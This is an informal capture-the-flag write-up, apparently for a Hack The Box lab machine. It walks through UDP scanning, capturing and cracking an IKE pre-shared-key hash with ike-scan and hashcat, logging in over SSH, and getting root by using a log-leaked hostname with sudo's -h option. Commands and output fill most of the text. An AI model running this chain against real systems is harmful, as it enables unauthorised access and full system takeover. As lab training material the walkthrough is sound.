this writeup will make you understand every thing inshal alalah to solve this machine

first i tired to sacn tcp ports

# scan ports

```
nmap -sV -sC 10.10.11.87
```

it gives me only that ssh is open

so next plan is to scan udp

```
nmap -sU -T5 10.10.11.87
```

it gives me another open port called isakmp

```
500/udp open  isakmp
```

so after search i found that we can scan the target ip that has this open service and get a hash password of the user 
so we can just use this command to output the hash to txt file

```
ike-scan -M -A 10.10.11.87 --pskcrack=output.txt
```

```
└─$ ike-scan -M -A 10.10.11.87 --pskcrack=output.txt        
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=b297d9fe9437113e)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)
```

and we see now the user called ike

and the type of the hash password is sha1 lets crack it using hashcat

```
hashcat -m 5400 -a 0 hash.txt Desktop/rockyou.txt
```

and boom we can login with ssh now with the user and passord we have collcted


```
ssh ike@10.10.11.87
```

and boom we can get the user.txt

# second part privesc

```
find / -perm -u=s -type f 2>/dev/null
```

and i found exim4 i tired to find any cve but my current vertion is patched any ways there is another strange thing too the sudo binary is in non-default directory

```
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```


so lets just found any data that can help us or any thing

```
cd /var/logs/
```

and we found there is a squid folder 

- Squid is a proxy server that receives user requests, caches web content in files to improve internet performance, and can also be used to block or control access to websites.

ok we can explore the squid folder to find any thing intersting like hosname or any thinge else

```
cat access.log.1
```

it gives to us this

```
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

- The log entry discloses the hostname `offramp.expressway.htb`, which can be leveraged when testing sudo permissions based on hostname matching.


- so lets check its premtions 


```
sudo -h offramp.expressway.htb -l
```

it gives me that

```
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

and lol its has root suid


we can just import shell with its suid

```
sudo -h offramp.expressway.htb /bin/bash
```


and boom we are root :)

Good luck
